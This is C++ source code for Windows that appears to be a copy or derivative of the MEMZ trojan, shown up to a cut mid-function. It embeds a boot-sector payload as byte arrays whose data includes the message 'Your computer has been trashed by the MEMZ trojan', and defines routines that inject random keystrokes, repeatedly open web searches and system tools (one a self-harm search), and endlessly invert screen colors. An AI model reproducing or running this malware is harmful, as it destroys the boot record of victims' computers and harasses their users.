#include <windows.h>
#include <shellapi.h>
#include <werapi.h> 
#include <winable.h>
#include <tchar.h>
#include <stdlib.h>
#include <time.h>
#include <vector>
#include <cstdio>
#include <string>
#include <pthread.h>
#include <iostream> 
#include <dirent.h>
#include <Mmsystem.h>
#include <math.h>
#include <cmath>
#include <bits/stdc++.h>
#include <string>
#include <random>
#include <regex>
#include <string>
#include <dirent.h>
#include <iostream>

#pragma once

#define random_in(a,b) (rand()%(b-a)+a) 
#define random_list(x) (rand()%x)
#define DESKTOP_WINDOW ((HWND)0)
#define PI 3.1415926

using namespace std;
LPCWSTR lpPaths[13] = {
	L"explorer.exe",
	L"taskmgr.exe",
	L"winlogon.exe",
	L"csrss.exe",
	L"dwm.exe",
	L"cmd.exe",
	L"svchost.exe",
	L"conhost.exe",
	L"smss.exe",
	L"wininit.exe",
	L"werfault.exe",
	L"winver.exe",
	L"regedit.exe" 
	
};

HCRYPTPROV prov;
int scrw = GetSystemMetrics(SM_CXSCREEN);
int scrh = GetSystemMetrics(SM_CYSCREEN);
HWND hwnd;
int times = 0;

const char *sounds[] = {
	"SystemAsterisk",
	"SystemExclamation",
	"SystemExit",
	"SystemHand",
	"SystemQuestion",
	"SystemStart",
};

const size_t nSounds = sizeof(sounds) / sizeof(void *);


const unsigned char code1[] = {
	0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x04, 0x02, 0xB9, 0x02,
	0x00, 0xB6, 0x00, 0xBB, 0x00, 0x00, 0xCD, 0x13, 0x31, 0xC0, 0x89, 0xC3,
	0x89, 0xC1, 0x89, 0xC2, 0xBE, 0x00, 0x00, 0xBF, 0x00, 0x40, 0xAC, 0x81,
	0xFE, 0x9E, 0x07, 0x73, 0x35, 0x3C, 0x80, 0x73, 0x03, 0xE9, 0x10, 0x00,
	0x24, 0x7F, 0x88, 0xC1, 0xAC, 0xAA, 0xFE, 0xC9, 0x80, 0xF9, 0xFF, 0x75,
	0xF7, 0xE9, 0xE2, 0xFF, 0x88, 0xC4, 0xAC, 0x89, 0xC3, 0xAC, 0x89, 0xF2,
	0x89, 0xDE, 0x81, 0xC6, 0x00, 0x40, 0x88, 0xC1, 0xAC, 0xAA, 0xFE, 0xC9,
	0x80, 0xF9, 0x00, 0x75, 0xF7, 0x89, 0xD6, 0xE9, 0xC4, 0xFF, 0xB0, 0xB6,
	0xE6, 0x43, 0xB8, 0x03, 0x10, 0xB3, 0x00, 0xCD, 0x10, 0xBF, 0x00, 0x00,
	0xBA, 0xC0, 0x9D, 0xB9, 0x00, 0xB8, 0x8E, 0xC1, 0xB8, 0x00, 0x00, 0xB9,
	0xD0, 0x07, 0xF3, 0xAB, 0xBE, 0x9C, 0x9F, 0xBF, 0x00, 0x00, 0xE4, 0x61,
	0x0C, 0x03, 0xE6, 0x61, 0xB3, 0x01, 0x52, 0xB4, 0x86, 0xB9, 0x00, 0x00,
	0xBA, 0x00, 0x60, 0xCD, 0x15, 0x5A, 0x81, 0xFE, 0xE8, 0x9F, 0x7D, 0x04,
	0xAC, 0xB4, 0xF0, 0xAB, 0xFE, 0xCB, 0x80, 0xFB, 0x00, 0x75, 0xE3, 0x56,
	0x89, 0xD6, 0xAD, 0x89, 0xC1, 0x80, 0xE4, 0x1F, 0xE6, 0x42, 0x88, 0xE0,
	0xE6, 0x42, 0xC0, 0xED, 0x05, 0xC0, 0xE5, 0x02, 0x88, 0xEB, 0x89, 0xF2,
	0x5E, 0x81, 0xFA, 0xF4, 0x9D, 0x75, 0xC3, 0xBE, 0x00, 0x40, 0xBF, 0x00,
	0x00, 0xB8, 0xE0, 0x07, 0x8E, 0xD8, 0xB8, 0x00, 0xB8, 0x8E, 0xC0, 0xFE,
	0xCB, 0xE9, 0x20, 0x00, 0xB0, 0xDC, 0xAA, 0xAC, 0xAA, 0x81, 0xFE, 0xC0,
	0x9D, 0x74, 0x42, 0x81, 0xFF, 0xA0, 0x0F, 0x74, 0x03, 0xE9, 0xEC, 0xFF,
	0x52, 0xB4, 0x86, 0xB9, 0x01, 0x00, 0xBA, 0x00, 0x60, 0xCD, 0x15, 0x5A,
	0xBF, 0x00, 0x00, 0x81, 0xFA, 0x9C, 0x9F, 0x75, 0x03, 0xBA, 0xF4, 0x9D,
	0xFE, 0xCB, 0x80, 0xFB, 0x00, 0x75, 0xCD, 0x56, 0x89, 0xD6, 0xAD, 0x89,
	0xC1, 0x80, 0xE4, 0x1F, 0xE6, 0x42, 0x88, 0xE0, 0xE6, 0x42, 0xC0, 0xED,
	0x05, 0x88, 0xEB, 0x89, 0xF2, 0x5E, 0xE9, 0xB3, 0xFF, 0xBE, 0x00, 0x40,
	0xE9, 0xC1, 0xFF
};

const unsigned char code2[] = {
	0x55, 0xAA, 0x83, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x08, 0x00, 0x00, 0x10, 0x00, 0x00, 0x20, 0x00, 0x35, 0x0B, 0x83, 0xF1,
	0xF1, 0x11, 0xF1, 0x00, 0x00, 0x4B, 0x00, 0x96, 0x04, 0x80, 0xFF, 0x00,
	0x4F, 0x4F, 0x00, 0x9F, 0x4F, 0x00, 0xEA, 0x53, 0x82, 0x1F, 0xF1, 0x1F,
	0x01, 0x42, 0x4E, 0x00, 0x4E, 0x50, 0x02, 0x12, 0x1F, 0x83, 0x10, 0x10,
	0x10, 0x10, 0x02, 0x50, 0x04, 0x02, 0x50, 0x08, 0x80, 0x10, 0x02, 0x31,
	0x1F, 0x83, 0x14, 0x14, 0x14, 0x14, 0x02, 0x80, 0x04, 0x83, 0x44, 0x44,
	0x44, 0x44, 0x02, 0x88, 0x04, 0x02, 0x80, 0x0E, 0x87, 0x40, 0x0E, 0xEE,
	0xEE, 0xED, 0xED, 0xED, 0xED, 0x02, 0xA2, 0x04, 0x02, 0xA5, 0x05, 0x82,
	0xEE, 0xEE, 0x0E, 0x02, 0x60, 0x1E, 0x02, 0x88, 0x08, 0x83, 0x46, 0x46,
	0x46, 0x46, 0x02, 0xD8, 0x04, 0x02, 0xD0, 0x0E, 0x8C, 0x00, 0xEE, 0xED,
	0xDD, 0xDC, 0xDD, 0xDD, 0xDD, 0xDD, 0xCD, 0xDD, 0xDD, 0xCD, 0x02, 0xF3,
	0x04, 0x83, 0xDD, 0xED, 0xEE, 0x00, 0x02, 0xB3, 0x1D, 0x83, 0x66, 0x66,
	0x66, 0x66, 0x03, 0x20, 0x04, 0x03, 0x20, 0x08, 0x03, 0x22, 0x0E, 0x81,
	0x00, 0xEE, 0x02, 0xFB, 0x05, 0x03, 0x41, 0x04, 0x83, 0xD0, 0x07, 0x07,
	0xD0, 0x02, 0xF9, 0x04, 0x84, 0xEE, 0x00, 0x10, 0x07, 0x07, 0x02, 0xB2,
	0x1A, 0x83, 0x6E, 0x6E, 0x6E, 0x6E, 0x03, 0x70, 0x04, 0x83, 0xEE, 0xEE,
	0xEE, 0xEE, 0x03, 0x78, 0x04, 0x03, 0x70, 0x08, 0x85, 0x00, 0x07, 0x07,
	0x00, 0xE0, 0xEE, 0x03, 0x3E, 0x08, 0x8F, 0xCD, 0xDD, 0xDD, 0x00, 0x77,
	0x77, 0x77, 0x07, 0xD0, 0xD0, 0xD0, 0xE0, 0x07, 0x77, 0x77, 0x77, 0x03,
	0x02, 0x1A, 0x03, 0x78, 0x08, 0x83, 0xEA, 0xEA, 0xEA, 0xEA, 0x03, 0xC8,
	0x04, 0x03, 0xC0, 0x08, 0x85, 0x0A, 0x00, 0x70, 0x77, 0x07, 0x00, 0x03,
	0x8E, 0x05, 0x02, 0xFA, 0x04, 0x81, 0xDC, 0xD0, 0x03, 0xA2, 0x04, 0x80,
	0x77, 0x03, 0xEA, 0x04, 0x03, 0xEE, 0x04, 0x03, 0x55, 0x1A, 0x83, 0xAA,
	0xAA, 0xAA, 0xAA, 0x04, 0x10, 0x04, 0x04, 0x10, 0x08, 0x04, 0x16, 0x0A,
	0x85, 0x0A, 0x00, 0x70, 0x70, 0x00, 0xEE, 0x02, 0xF9, 0x07, 0x03, 0x98,
	0x05, 0x80, 0xF0, 0x04, 0x38, 0x04, 0x80, 0x70, 0x04, 0x3B, 0x05, 0x03,
	0xA6, 0x19, 0x83, 0xA3, 0xA3, 0xA3, 0xA3, 0x04, 0x60, 0x04, 0x83, 0x33,
	0x33, 0x33, 0x33, 0x04, 0x68, 0x04, 0x04, 0x60, 0x0D, 0x83, 0x03, 0x00,
	0xEE, 0xDE, 0x02, 0xF1, 0x04, 0x03, 0x96, 0x07, 0x81, 0x77, 0x70, 0x04,
	0x3F, 0x04, 0x04, 0x8C, 0x04, 0x04, 0x46, 0x1A, 0x04, 0x68, 0x08, 0x87,
	0x39, 0x39, 0x39, 0x39, 0xF9, 0x39, 0x39, 0x39, 0x04, 0xB0, 0x0C, 0x9A,
	0x39, 0x30, 0x00, 0xE0, 0xEE, 0xEE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE,
	0xDE, 0x0E, 0x70, 0x77, 0x77, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
	0x77, 0x70, 0x01, 0x03, 0xA7, 0x19, 0x83, 0x99, 0x99, 0x99, 0x99, 0x05,
	0x00, 0x04, 0x81, 0x99, 0x9F, 0x05, 0x04, 0x06, 0x05, 0x00, 0x09, 0x88,
	0x99, 0x99, 0x99, 0x00, 0x77, 0x77, 0x70, 0x00, 0x01, 0x03, 0x88, 0x04,
	0x83, 0x01, 0x01, 0x01, 0x01, 0x05, 0x21, 0x06, 0x05, 0x2B, 0x05, 0x03,
	0x05, 0x1B, 0x83, 0x91, 0x91, 0x91, 0x91, 0x05, 0x50, 0x04, 0x05, 0x48,
	0x10, 0x05, 0x5C, 0x04, 0x05, 0x27, 0x04, 0x05, 0x6A, 0x05, 0x05, 0x59,
	0x07, 0x05, 0x6D, 0x07, 0x01, 0xB8, 0x98, 0x00, 0x9F, 0xF1, 0x06, 0x99,
	0x73, 0x05, 0xAC, 0x93, 0x07, 0x7F, 0x06, 0x07, 0x7F, 0x4B, 0x82, 0xF1,
	0x11, 0x1F, 0x05, 0xAB, 0xFF, 0x08, 0xAA, 0xBB, 0x02, 0x50, 0xF9, 0x03,
	0x48, 0x05, 0x03, 0x4E, 0x05, 0x80, 0x11, 0x03, 0x53, 0x1C, 0x03, 0x70,
	0x18, 0x84, 0xEE, 0xE0, 0xE0, 0xEE, 0xEE, 0x03, 0x8D, 0x0C, 0x03, 0x98,
	0x08, 0x81, 0xE0, 0x00, 0x03, 0xA2, 0x1D, 0x03, 0xC0, 0x18, 0x04, 0x44,
	0x04, 0x81, 0xE0, 0xE0, 0x03, 0xDE, 0x0A, 0x80, 0xDD, 0x03, 0xE8, 0x27,
	0x04, 0x11, 0x1A, 0x83, 0x70, 0x70, 0x77, 0x77, 0x04, 0x2E, 0x0A, 0x04,
	0x37, 0x28, 0x04, 0x60, 0x1C, 0x80, 0x03, 0x04, 0x7D, 0x0B, 0x04, 0x87,
	0x28, 0x04, 0xC0, 0x0D, 0x04, 0xBD, 0x10, 0x80, 0x39, 0x04, 0xCE, 0x0B,
	0x04, 0xD8, 0x27, 0x05, 0x10, 0x0C, 0x0C, 0xD0, 0x0C, 0x05, 0x17, 0x08,
	0x05, 0x20, 0x0B, 0x05, 0x2A, 0x25, 0x05, 0x62, 0x06, 0x80, 0xF1, 0x05,
	0x57, 0x15, 0x05, 0x71, 0x07, 0x05, 0x72, 0x11, 0x05, 0x82, 0x2A, 0x05,
	0xAD, 0xFF, 0x06, 0xB1, 0xFF, 0x07, 0xB5, 0xAE, 0x81, 0x11, 0x11, 0x01,
	0x92, 0x4F, 0x00, 0xDC, 0xB5, 0x0E, 0xFC, 0x9C, 0x00, 0x4B, 0x54, 0x0A,
	0x59, 0x15, 0x12, 0x25, 0x0A, 0x84, 0x10, 0x0E, 0x0E, 0x0E, 0x0E, 0x12,
	0x40, 0x04, 0x12, 0x40, 0x08, 0x0A, 0x81, 0x1F, 0x80, 0x11, 0x0A, 0xA9,
	0x15, 0x12, 0x75, 0x09, 0x83, 0x00, 0xEE, 0xEE, 0xED, 0x0C, 0x04, 0x05,
	0x80, 0xDC, 0x0B, 0xB5, 0x04, 0x0A, 0xCD, 0x05, 0x0A, 0xD1, 0x41, 0x0C,
	0x01, 0x08, 0x82, 0xDD, 0xD0, 0xD0, 0x12, 0x99, 0x04, 0x12, 0xA1, 0x04,
	0x0A, 0x2F, 0x1B, 0x0B, 0x49, 0x10, 0x13, 0x10, 0x0E, 0x0B, 0x5E, 0x08,
	0x12, 0x9A, 0x04, 0x80, 0x00, 0x0B, 0x6C, 0x04, 0x03, 0x4F, 0x06, 0x0B,
	0x75, 0x1B, 0x0B, 0x99, 0x0F, 0x0B, 0x98, 0x0F, 0x13, 0x2E, 0x05, 0x12,
	0x9A, 0x05, 0x0C, 0x57, 0x07, 0x0C, 0xB1, 0x05, 0x0B, 0x74, 0x1C, 0x04,
	0x10, 0x1A, 0x82, 0xA0, 0xA0, 0xA0, 0x03, 0xDD, 0x04, 0x13, 0x83, 0x06,
	0x80, 0xCD, 0x13, 0x89, 0x05, 0x80, 0x7F, 0x0C, 0x64, 0x04, 0x13, 0xDB,
	0x06, 0x0C, 0x68, 0x1F, 0x0C, 0x30, 0x11, 0x0B, 0x72, 0x04, 0x04, 0x2C,
	0x05, 0x13, 0x32, 0x0B, 0x80, 0x77, 0x13, 0x91, 0x05, 0x80, 0x07, 0x14,
	0x2C, 0x05, 0x13, 0xE8, 0x18, 0x0C, 0x89, 0x15, 0x14, 0x55, 0x04, 0x88,
	0x03, 0x03, 0x03, 0x03, 0x33, 0x00, 0xEE, 0xEE, 0xDE, 0x12, 0xE2, 0x07,
	0x80, 0x0D, 0x0C, 0x64, 0x05, 0x81, 0x70, 0x70, 0x04, 0x2B, 0x04, 0x80,
	0x77, 0x0C, 0xB5, 0x1A, 0x05, 0x0E, 0x0E, 0x0C, 0xDD, 0x11, 0x84, 0x07,
	0xE0, 0xE0, 0xE0, 0xE0, 0x14, 0xC0, 0x04, 0x87, 0xE0, 0xE0, 0xE0, 0x00,
	0x70, 0x70, 0x70, 0x70, 0x14, 0xCC, 0x04, 0x80, 0x70, 0x04, 0xE5, 0x1B,
	0x81, 0xF1, 0x1F, 0x11, 0xCF, 0x05, 0x05, 0x50, 0x17, 0x80, 0x00, 0x14,
	0xD4, 0x04, 0x82, 0x01, 0x70, 0x70, 0x14, 0x38, 0x07, 0x15, 0x13, 0x05,
	0x15, 0x13, 0x0A, 0x05, 0xAD, 0xFF, 0x0F, 0xE2, 0xE7, 0x0F, 0xD9, 0x93,
	0x05, 0xAC, 0xFF, 0x16, 0x23, 0xA0, 0x17, 0xA5, 0x04, 0x08, 0x18, 0x4D,
	0x08, 0x14, 0x5B, 0x12, 0x20, 0xFF, 0x13, 0x1F, 0xAD, 0x81, 0x07, 0x07,
	0x13, 0xCE, 0x4A, 0x83, 0xA0, 0x07, 0x77, 0x70, 0x14, 0x1C, 0x4C, 0x84,
	0x03, 0x70, 0x70, 0x03, 0x33, 0x14, 0x6D, 0x34, 0x14, 0xA2, 0x1C, 0x81,
	0x90, 0x07, 0x14, 0xBF, 0x31, 0x05, 0x49, 0x1D, 0x15, 0x0E, 0xFF, 0x18,
	0x97, 0xFF, 0x08, 0x15, 0x94, 0x14, 0xF0, 0x07, 0x05, 0xAD, 0xFF, 0x16,
	0x2D, 0xFF, 0x20, 0x84, 0x4C, 0x0A, 0x50, 0x1E, 0x81, 0x44, 0x40, 0x1A,
	0x10, 0x30, 0x0A, 0xA0, 0x20, 0x1A, 0x60, 0x5A, 0x81, 0xD0, 0xD0, 0x22,
	0x38, 0x05, 0x0B, 0x21, 0x04, 0x21, 0xF1, 0x1B, 0x0B, 0x40, 0x19, 0x1B,
	0x49, 0x0A, 0x22, 0x34, 0x06, 0x1B, 0x0A, 0x07, 0x81, 0xDD, 0xEE, 0x14,
	0x18, 0x04, 0x03, 0xA6, 0x31, 0x81, 0xE0, 0x07, 0x03, 0x89, 0x04, 0x0B,
	0xAD, 0x06, 0x1B, 0xA1, 0x06, 0x1B, 0x5A, 0x26, 0x1B, 0x7F, 0x18, 0x81,
	0x0A, 0x0A, 0x1C, 0xA2, 0x04, 0x1B, 0x9D, 0x0B, 0x1B, 0xA9, 0x27, 0x0C,
	0x2F, 0x21, 0x22, 0xD1, 0x0B, 0x1B, 0xFC, 0x24, 0x0C, 0x7F, 0x1E, 0x80,
	0x30, 0x1C, 0x3E, 0x0A, 0x1C, 0x49, 0x27, 0x1C, 0x6F, 0x1C, 0x80, 0x90,
	0x23, 0x18, 0x06, 0x1C, 0x93, 0x2E, 0x05, 0x50, 0x1B, 0x15, 0x0E, 0xFF,
	0x10, 0xD9, 0xF8, 0x80, 0xF1, 0x26, 0x50, 0x4D, 0x00, 0x9E, 0x47, 0x82,
	0xF1, 0xF1, 0x1F, 0x26, 0xA2, 0x4E, 0x05, 0xAB, 0xFF, 0x06, 0xE0, 0xFF,
	0x21, 0xB6, 0xD3, 0x03, 0x49, 0x05, 0x22, 0x8E, 0x05, 0x03, 0x53, 0x35,
	0x0B, 0x58, 0x0E, 0x23, 0xC5, 0x08, 0x03, 0x9E, 0x3A, 0x0B, 0xA8, 0x0B,
	0x2A, 0x0A, 0x05, 0x03, 0xE8, 0x41, 0x0B, 0xF9, 0x08, 0x23, 0x71, 0x0B,
	0x04, 0x3C, 0x40, 0x23, 0xBC, 0x10, 0x04, 0x8C, 0x30, 0x23, 0xFC, 0x1C,
	0x24, 0x17, 0x05, 0x0C, 0xAE, 0x22, 0x80, 0x1F, 0x24, 0x40, 0x1D, 0x80,
	0x77, 0x24, 0x5E, 0x0C, 0x86, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0C, 0xF4, 0x04, 0x29, 0x0C, 0x1B, 0x24, 0x90, 0x20, 0x2C, 0x7B, 0x05,
	0x2C, 0x6B, 0x05, 0x24, 0xAB, 0x0F, 0x00, 0x38, 0xFF, 0x2D, 0x19, 0x7F,
	0x2C, 0xFF, 0x4E, 0x27, 0x37, 0x98, 0x26, 0x9D, 0x9A, 0x05, 0xAD, 0xFF,
	0x25, 0xF5, 0x5A, 0x1F, 0x6F, 0x40, 0x0A, 0x20, 0x30, 0x19, 0xF0, 0x1E,
	0x80, 0x10, 0x0A, 0x6F, 0x31, 0x1A, 0x40, 0x20, 0x02, 0xF0, 0x80, 0x1A,
	0xE0, 0x18, 0x0D, 0x01, 0x04, 0x80, 0x60, 0x1A, 0xFD, 0x09, 0x03, 0x96,
	0x2A, 0x1B, 0x30, 0x18, 0x80, 0x0E, 0x03, 0xD9, 0x87, 0x1B, 0xD0, 0x18,
	0x33, 0x4A, 0x05, 0x04, 0x7D, 0x33, 0x14, 0x50, 0x19, 0x33, 0x9B, 0x04,
	0x04, 0xCD, 0x29, 0x30, 0xA1, 0x0A, 0x0C, 0xD1, 0x1F, 0x05, 0x1F, 0x25,
	0x1E, 0x89, 0x13, 0x2C, 0x60, 0x15, 0x05, 0x6C, 0x27, 0x08, 0x12, 0xFF,
	0x30, 0x33, 0xFD, 0x07, 0xBE, 0xFF, 0x2D, 0x1A, 0xFF, 0x2E, 0x19, 0x93,
	0x31, 0x36, 0x0B, 0x80, 0xF0, 0x31, 0x3C, 0xED, 0x0B, 0x19, 0x27, 0x1A,
	0xE0, 0x19, 0x81, 0x60, 0x60, 0x1A, 0xFB, 0x0B, 0x0B, 0x66, 0x2A, 0x32,
	0xA0, 0x18, 0x0B, 0xA8, 0x88, 0x33, 0x40, 0x1C, 0x0C, 0x4C, 0x34, 0x33,
	0x90, 0x1D, 0x80, 0x33, 0x0C, 0x9E, 0x1F, 0x35, 0xE0, 0x13, 0x0C, 0xD0,
	0x50, 0x24, 0x89, 0x1D, 0x0D, 0x3D, 0x1D, 0x0F, 0xD9, 0xFF, 0x06, 0xBC,
	0xFF, 0x0F, 0x88, 0xFF, 0x10, 0x84, 0xFF, 0x26, 0x54, 0xCA, 0x21, 0xC0,
	0xCA, 0x1A, 0xBA, 0x26, 0x22, 0xB0, 0x29, 0x1B, 0x09, 0x27, 0x2A, 0xD0,
	0x18, 0x42, 0x4A, 0x06, 0x13, 0x7E, 0x82, 0x2B, 0x70, 0x18, 0x14, 0x18,
	0x38, 0x2B, 0xC0, 0x19, 0x84, 0x09, 0x09, 0x09, 0x09, 0x39, 0x1C, 0x3E,
	0x4F, 0x14, 0xBD, 0x33, 0x05, 0x50, 0x1C, 0x24, 0xA9, 0x15, 0x80, 0xF1,
	0x15, 0x22, 0xFF, 0x16, 0x51, 0xFF, 0x17, 0x50, 0xFF, 0x18, 0x4D, 0xFF,
	0x36, 0x7C, 0xD2, 0x41, 0x00, 0xFF, 0x41, 0xFF, 0xAD, 0x1B, 0x9C, 0x34,
	0x42, 0xE0, 0x18, 0x80, 0x30, 0x1B, 0xE9, 0x37, 0x43, 0x30, 0x18, 0x84,
	0x09, 0x70, 0x70, 0x09, 0x39, 0x43, 0x4D, 0x50, 0x1C, 0x8D, 0x33, 0x43,
	0xD0, 0x1D, 0x43, 0xEE, 0x0C, 0x82, 0xF1, 0xF1, 0x1F, 0x24, 0xBA, 0x4F,
	0x46, 0x55, 0xD1, 0x1E, 0x3B, 0xFF, 0x01, 0x5B, 0x37, 0x05, 0xAD, 0xFF,
	0x16, 0x29, 0xFF, 0x4F, 0x30, 0x80, 0x19, 0xF0, 0xCA, 0x22, 0x8A, 0x26,
	0x1A, 0xE0, 0x29, 0x22, 0xD9, 0x27, 0x3A, 0x70, 0x17, 0x23, 0x17, 0x89,
	0x3B, 0x10, 0x20, 0x23, 0xC0, 0x30, 0x33, 0x90, 0x1F, 0x24, 0x0F, 0x81,
	0x4B, 0x99, 0x1B, 0x4B, 0xBD, 0x04, 0x44, 0x01, 0x05, 0x40, 0x84, 0x06,
	0x4B, 0xCC, 0x48, 0x2F, 0x50, 0xD0, 0x3F, 0xE2, 0x9D, 0x40, 0x81, 0x04,
	0x2F, 0x01, 0xFF, 0x05, 0xAD, 0xFF, 0x06, 0xFA, 0xFF, 0x50, 0x80, 0xE9,
	0x2A, 0x59, 0x27, 0x3A, 0x20, 0x26, 0x2A, 0xA6, 0x2A, 0x3A, 0x70, 0x23,
	0x2A, 0xF3, 0x7D, 0x52, 0x80, 0x2C, 0x33, 0x6C, 0x3B, 0x80, 0x3F, 0x52,
	0xE8, 0x10, 0x2B, 0xE8, 0x27, 0x53, 0x1F, 0x16, 0x80, 0xF9, 0x5B, 0x02,
	0x04, 0x2C, 0x2A, 0x35, 0x53, 0x6F, 0x15, 0x80, 0xF1, 0x5B, 0x45, 0x05,
	0x80, 0xF1, 0x2C, 0x7B, 0x31, 0x08, 0x4A, 0xFF, 0x57, 0x90, 0x97, 0x5C,
	0xD1, 0x4F, 0x5D, 0x22, 0x4F, 0x87, 0x7E, 0x27, 0x12, 0x27, 0x4C, 0x46,
	0xB8, 0x44, 0x5D, 0xC0, 0x05, 0x8E, 0x26, 0xB8, 0x24, 0x34, 0x24, 0xBF,
	0x23, 0x34, 0x24, 0x00, 0x25, 0xB8, 0x44, 0x4C, 0x46, 0x5D, 0xC0, 0x08,
	0x5D, 0xD4, 0x05, 0xA0, 0x24, 0x34, 0x24, 0x89, 0x23, 0xBF, 0x23, 0x89,
	0x23, 0x34, 0x24, 0x4C, 0x46, 0x9D, 0x45, 0x7E, 0x27, 0x7E, 0x27, 0x70,
	0x49, 0xF0, 0x27, 0x68, 0x28, 0x70, 0x29, 0x70, 0x69, 0x68, 0x48, 0xF0,
	0x47, 0x5D, 0xFE, 0x06, 0x87, 0x68, 0x28, 0x7E, 0x27, 0x4C, 0x26, 0x9D,
	0x25, 0x5E, 0x12, 0x04, 0x5E, 0x10, 0x04, 0x5E, 0x0E, 0x04, 0x85, 0x70,
	0x29, 0x7E, 0x47, 0x4C, 0x46, 0x5E, 0x16, 0x0C, 0x83, 0xF0, 0x27, 0x7E,
	0x27, 0x5E, 0x0A, 0x08, 0x81, 0xF0, 0x47, 0x5E, 0x0E, 0x08, 0x5E, 0x46,
	0x04, 0x5E, 0x3C, 0x05, 0x84, 0x48, 0x70, 0x49, 0x68, 0x48, 0x5D, 0xF4,
	0x66, 0x85, 0x70, 0x49, 0x99, 0x2C, 0x39, 0x2B, 0x5E, 0xC0, 0x06, 0x5E,
	0xAA, 0x06, 0x83, 0x70, 0x29, 0x12, 0x27, 0x5D, 0xC8, 0x06, 0x81, 0x70,
	0x49, 0x5E, 0xC6, 0x08, 0x81, 0x99, 0x2C, 0x5E, 0xD4, 0x04, 0x5E, 0xB6,
	0x04, 0x87, 0x99, 0x2C, 0xFB, 0x2E, 0x24, 0x2E, 0x99, 0x2C, 0x5E, 0xC0,
	0x0E, 0x5E, 0xCC, 0x08, 0x5F, 0x00, 0x04, 0x5E, 0xF6, 0x04, 0x83, 0x70,
	0x29, 0x00, 0x2A, 0x5F, 0x0C, 0x06, 0x5E, 0xD2, 0x0C, 0x81, 0x00, 0x4A,
	0x5E, 0xC0, 0x6C, 0xBC, 0x68, 0x48, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x63,
	0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72, 0x20, 0x68, 0x61, 0x73, 0x20,
	0x62, 0x65, 0x65, 0x6E, 0x20, 0x74, 0x72, 0x61, 0x73, 0x68, 0x65, 0x64,
	0x20, 0x62, 0x79, 0x20, 0x74, 0x68, 0x65, 0x20, 0x4D, 0x45, 0x4D, 0x5A,
	0x20, 0x74, 0x72, 0x6F, 0x6A, 0x61, 0x6E, 0x2E, 0x20, 0x4E, 0x6F, 0x77,
	0x20, 0x65, 0x6E, 0x6A, 0x6F, 0x5F, 0xBC, 0x06, 0x8A, 0x4E, 0x79, 0x61,
	0x6E, 0x20, 0x43, 0x61, 0x74, 0x2E, 0x2E, 0x2E
};

const size_t code1_len = sizeof(code1);
const size_t code2_len = sizeof(code2);

void disable_redraw(){
	SendMessage(hwnd, WM_SETREDRAW, FALSE, 0L);
}
void randClick(){
	INPUT input;
	input.type = INPUT_KEYBOARD;
	input.ki.wVk = random_in(48, 90);
	SendInput(1, &input, sizeof(INPUT));
}
void infclick(){
	for (;;){
		randClick();
		Sleep(random_in(5000,8000));
	}
}

const char *sites[] = {
	"http://baidu.com/s?wd=best+way+to+kill+yourself",
	"http://baidu.com/s?wd=how+2+remove+a+virus",
	"http://baidu.com/s?wd=mcafee+vs+norton",
	"http://baidu.com/s?wd=how+to+send+a+virus+to+my+friend",
	"http://baidu.com/s?wd=minecraft+hax+download+no+virus",
	"http://baidu.com/s?wd=how+to+get+money",
	"http://baidu.com/s?wd=bonzi+buddy+download+free",
	"http://baidu.com/s?wd=how+2+buy+weed",
	"http://baidu.com/s?wd=how+to+code+a+virus+in+visual+basic",
	"http://baidu.com/s?wd=what+happens+if+you+delete+system32",
	"http://baidu.com/s?wd=g3t+r3kt",
	"http://baidu.com/s?wd=batch+virus+download",
	"http://baidu.com/s?wd=virus.exe",
	"http://baidu.com/s?wd=internet+explorer+is+the+best+browser",
	"http://baidu.com/s?wd=facebook+hacking+tool+free+download+no+virus+working+2016",
	"http://baidu.com/s?wd=virus+builder+legit+free+download",
	"http://baidu.com/s?wd=how+to+create+your+own+ransomware",
	"http://baidu.com/s?wd=how+to+remove+memz+trojan+virus",
	"http://baidu.com/s?wd=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
	"http://baidu.com/s?wd=dank+memz",
	"http://baidu.com/s?wd=how+to+download+memz",
	"http://baidu.com/s?wd=half+life+3+release+date",
	"http://baidu.com/s?wd=is+illuminati+real",
	"http://baidu.com/s?wd=montage+parody+making+program+2016",
	"http://baidu.com/s?wd=the+memz+are+real",
	"http://baidu.com/s?wd=stanky+danky+maymays",
	"http://baidu.com/s?wd=john+cena+midi+legit+not+converted",
	"http://baidu.com/s?wd=vinesauce+meme+collection",
	"http://baidu.com/s?wd=skrillex+scay+onster+an+nice+sprites+midi",
	"http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45",
	"http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
	"http://play.clubpenguin.com",
	"http://pcoptimizerpro.com",
	"http://softonic.com",
	"calc",
	"notepad",
	"cmd",
	"write",
	"regedit",
	"explorer",
	"taskmgr",
	"msconfig",
	"mspaint",
	"devmgmt.msc",
	"control",
	"mmc",
};

const size_t nSites = sizeof(sites) / sizeof(void *);

void payloadExecute() {
	ShellExecuteA(NULL, "open", (LPCSTR)sites[rand() % nSites], NULL, NULL, SW_SHOWDEFAULT);
}

void randomExecute(){
	for(;;){
		payloadExecute();
		Sleep(random_in(8000,25000));
	}
}
void strReverseW(LPWSTR str) {
	int len = lstrlenW(str);

	if (len <= 1)
		return;

	WCHAR c;
	int i, j;
	for (i = 0, j = len - 1; i < j; i++, j--) {
		c = str[i];
		str[i] = str[j];
		str[j] = c;
	}

	// Fix Newlines
	for (i = 0; i < len - 1; i++) {
		if (str[i] == L'\n' && str[i + 1] == L'\r') {
			str[i] = L'\r';
			str[i + 1] = L'\n';
		}
	}
}

void InvertColor() {
	int cx = GetSystemMetrics(SM_CXFULLSCREEN);
	int cy = GetSystemMetrics(SM_CYFULLSCREEN);
	HDC hdc = GetDC(0);
	BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, NOTSRCCOPY);
}
void infInvColor(){
	for(;;){
		InvertColor();
		Sleep(200);
	}
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
